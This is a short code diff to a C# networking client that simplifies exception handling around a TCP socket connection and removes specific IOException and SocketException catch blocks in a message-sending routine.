@@ -268,16 +268,7 @@ namespace Pulsar.Client.Networking
 
                 handle = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                 handle.SetKeepAliveEx(KEEP_ALIVE_INTERVAL, KEEP_ALIVE_TIME);
-                try
-                {
-                    handle.Connect(ip, port);
-                }
-                catch (SocketException ex)
-                {
-                    Debug.WriteLine($"Connection refused: {ex.Message}");
-                }
-
-
+                handle.Connect(ip, port);
 
                 if (handle.Connected)
                 {
@@ -575,18 +566,6 @@ namespace Pulsar.Client.Networking
                 {
                     OnClientWrite(message, pw.WriteMessage(message));
                 }
-            }
-            catch (IOException ex)
-            {
-                Debug.WriteLine($"IOException: {ex.Message}");
-                Disconnect();
-                SendCleanup(true);
-            }
-            catch (SocketException ex)
-            {
-                Debug.WriteLine($"SocketException: {ex.Message}");
-                Disconnect();
-                SendCleanup(true);
             }
             catch (Exception ex)
             {
